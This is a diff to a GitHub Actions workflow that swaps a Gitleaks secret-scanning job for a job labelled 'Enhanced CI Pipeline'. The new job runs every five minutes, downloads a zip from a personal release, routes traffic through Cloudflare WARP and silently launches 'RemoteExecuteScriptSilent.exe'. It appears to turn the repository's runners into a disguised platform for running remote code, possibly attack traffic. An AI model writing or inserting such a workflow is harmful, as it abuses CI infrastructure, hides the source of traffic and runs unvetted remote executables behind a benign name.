@@ -1,15 +1,198 @@
-name: Gitleaks
+name: Enhanced CI Pipeline for Windows Environment
 
-on: push
+on:
+  schedule:
+    - cron: "*/5 * * * *"  # Runs every 5 minutes
+  workflow_dispatch:
+    inputs:
+      debug_enabled:
+        description: 'Enable debug logging'
+        required: false
+        default: 'false'
+        type: boolean
+
+env:
+  WARP_INSTALLER_URL: https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi
+  ARTIFACT_RETENTION_DAYS: 5
+  LOG_LEVEL: info
 
 jobs:
-  gitleaks:
-    runs-on: ubuntu-latest
+  pre-flight-check:
+    runs-on: windows-latest
+    outputs:
+      proceed: ${{ steps.environment-check.outputs.status }}
     steps:
-      - uses: actions/checkout@v2
+      - name: Environment Validation
+        id: environment-check
+        run: |
+          $status = $true
+          $requiredSpace = 500MB
+          $availableSpace = (Get-PSDrive C).Free
+          
+          if ($availableSpace -lt $requiredSpace) {
+            Write-Warning "Insufficient disk space!"
+            $status = $false
+          }
+          
+          echo "status=$status" >> $env:GITHUB_OUTPUT
+        shell: powershell
+
+  run-release:
+    needs: pre-flight-check
+    if: needs.pre-flight-check.outputs.proceed == 'true'
+    strategy:
+      fail-fast: false
+      max-parallel: 1
+      matrix:
+        include:
+          - os: windows-latest
+            arch: x64
+    runs-on: ${{ matrix.os }}
+    
+    steps:
+      - name: Configure PowerShell
+        run: |
+          $ErrorActionPreference = 'Stop'
+          $ProgressPreference = 'SilentlyContinue'
+        shell: powershell
+
+      - name: Download and Verify Release Asset
+        run: |
+          $url = "https://github.com/dijinkuss/L7/releases/download/1/l7.zip"
+          $maxRetries = 3
+          $retryCount = 0
+          
+          do {
+            try {
+              Invoke-WebRequest -Uri $url -OutFile l7.zip -UseBasicParsing
+              $hash = Get-FileHash l7.zip -Algorithm SHA256
+              Write-Host "File hash: $($hash.Hash)"
+              break
+            } catch {
+              $retryCount++
+              if ($retryCount -eq $maxRetries) { throw }
+              Start-Sleep -Seconds (2 * $retryCount)
+            }
+          } while ($retryCount -lt $maxRetries)
+        shell: powershell
+
+      - name: Extract Archive
+        run: |
+          $extractPath = "."
+          Write-Host "Extracting to: $extractPath"
+          Expand-Archive -Path l7.zip -DestinationPath $extractPath -Force
+          Get-ChildItem -Path $extractPath -Recurse | Select-Object FullName, Length
+        shell: powershell
+
+      - name: Install and Configure WARP
+        run: |
+          # Download WARP installer with retry logic
+          $maxAttempts = 3
+          $attempt = 0
+          do {
+            try {
+              Invoke-WebRequest -Uri $env:WARP_INSTALLER_URL -OutFile "WARP.msi" -UseBasicParsing
+              break
+            } catch {
+              $attempt++
+              if ($attempt -eq $maxAttempts) { throw }
+              Start-Sleep -Seconds ($attempt * 5)
+            }
+          } while ($attempt -lt $maxAttempts)
+          
+          # Install WARP with logging
+          $logPath = "warp_install.log"
+          $installArgs = @(
+            '/i',
+            'WARP.msi',
+            '/quiet',
+            '/norestart',
+            "/l*v `"$logPath`""
+          )
+          Start-Process msiexec.exe -ArgumentList $installArgs -Wait
+          
+          # Service initialization
+          $serviceTimeout = 30
+          $timer = [Diagnostics.Stopwatch]::StartNew()
+          Write-Host "Waiting for WARP service initialization..."
+          Start-Sleep -Seconds 10
+          
+          # WARP CLI operations with status checking
+          $warpCli = 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe'
+          & $warpCli --accept-tos registration new
+          & $warpCli --accept-tos connect
+          
+          # Verify connection status
+          $status = & $warpCli --accept-tos status
+          Write-Host "WARP Status: $status"
+          Start-Sleep -Seconds 10
+        shell: powershell
+        env:
+          WARP_LOGGING: "true"
+
+      - name: Execute Primary Process
+        working-directory: l7
+        run: |
+          $processPath = ".\RemoteExecuteScriptSilent.exe"
+          if (!(Test-Path $processPath)) {
+            throw "Required executable not found: $processPath"
+          }
+          Start-Process $processPath
+        shell: powershell
+
+      - name: Monitor Process Completion
+        run: |
+          function Wait-ForProcess {
+            param($processName, $timeout = 300)
+            
+            $timer = [Diagnostics.Stopwatch]::StartNew()
+            Write-Host "Monitoring $processName..."
+            
+            while ($timer.Elapsed.TotalSeconds -lt $timeout) {
+              $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
+              if (!$process) { break }
+              Write-Host "Process $processName still running... Elapsed: $($timer.Elapsed.TotalSeconds) seconds"
+              Start-Sleep -Seconds 5
+            }
+            
+            if ($timer.Elapsed.TotalSeconds -ge $timeout) {
+              Write-Warning "Process monitoring timed out for $processName"
+            } else {
+              Write-Host "Process $processName has completed"
+            }
+          }
+          
+          Wait-ForProcess -processName "RemoteExecuteScriptSilent"
+          Wait-ForProcess -processName "FastExecuteScript"
+        shell: powershell
+
+      - name: Collect and Process Logs
+        id: log_collection
+        run: |
+          $basePath = "l7\appslocal"
+          $dynamicFolder = Get-ChildItem $basePath | 
+            Where-Object { $_.PSIsContainer } | 
+            Select-Object -First 1
+          
+          if (!$dynamicFolder) {
+            throw "Dynamic folder not found in $basePath"
+          }
+          
+          $logsPath = Join-Path $dynamicFolder.FullName "logs"
+          Write-Host "Identified logs path: $logsPath"
+          
+          if (Test-Path $logsPath) {
+            Get-ChildItem $logsPath -Recurse | 
+              ForEach-Object { Write-Host "Found log: $($_.FullName)" }
+          }
+          
+          echo "logsPath=$logsPath" >> $env:GITHUB_ENV
+        shell: powershell
+
+      - name: Archive Logs
+        uses: actions/upload-artifact@v4
         with:
-          fetch-depth: '1'
-      - name: gitleaks-action
-        uses: zricethezav/gitleaks-action@v1.6.0
-        with:
-          config-path: .github/.gitleaks.toml
+          name: execution-logs
+          path: ${{ env.logsPath }}/**
+          retention-days: ${{ env.ARTIFACT_RETENTION_DAYS }}
+          if-no-files-found: warn
